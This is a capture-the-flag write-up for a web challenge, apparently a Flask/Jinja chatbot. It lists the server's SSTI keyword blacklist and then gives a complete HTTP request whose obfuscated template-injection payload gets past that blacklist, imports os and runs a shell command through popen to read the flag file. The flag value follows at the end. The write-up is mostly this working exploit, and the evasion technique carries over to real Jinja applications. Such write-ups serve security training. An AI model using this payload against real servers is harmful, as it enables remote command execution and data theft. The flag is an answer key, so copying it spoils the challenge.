# web/Unintelligible-Chatbot

I thought building chatbots would be easy... Seems like my chatbot doesn't understand much.

http://34.132.132.69:8006/

## Solution

Crazy blacklist for SSTI.

Blacklisted Words:

```python
blacklist = [
        "config", "self", "mro", "base",
        "[", "_", ".", "%"
    ]
```

I declare `fenjang` is the best SSTI payload constructor ever!

Final payload:

```http
POST / HTTP/1.1
Host: 34.132.132.69:8006
Content-Length: 868
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://34.132.132.69:8006
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.132.132.69:8006/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

message={{((g|attr('pop')|attr((lipsum|escape|batch(22)|list|first|last*2)|attr("\x5f\x5fadd\x5f\x5f")('globals')|attr("\x5f\x5fadd\x5f\x5f")(lipsum|escape|batch(22)|list|first|last*2))|attr((lipsum|escape|batch(22)|list|first|last*2)|attr("\x5f\x5fadd\x5f\x5f")('getitem')|attr("\x5f\x5fadd\x5f\x5f")(lipsum|escape|batch(22)|list|first|last*2))((lipsum|escape|batch(22)|list|first|last*2)|attr("\x5f\x5fadd\x5f\x5f")('builtins')|attr("\x5f\x5fadd\x5f\x5f")(lipsum|escape|batch(22)|list|first|last*2))|attr((lipsum|escape|batch(22)|list|first|last*2)|attr("\x5f\x5fadd\x5f\x5f")('getitem')|attr("\x5f\x5fadd\x5f\x5f")(lipsum|escape|batch(22)|list|first|last*2))((lipsum|escape|batch(22)|list|first|last*2)|attr("\x5f\x5fadd\x5f\x5f")('import')|attr("\x5f\x5fadd\x5f\x5f")(lipsum|escape|batch(22)|list|first|last*2)))('os')|attr('popen'))('cat%20flag')|attr('read')()}}
```

## Flag

```plaintext
flag{n07_4n07h3r_5571_ch4ll3n63}
```

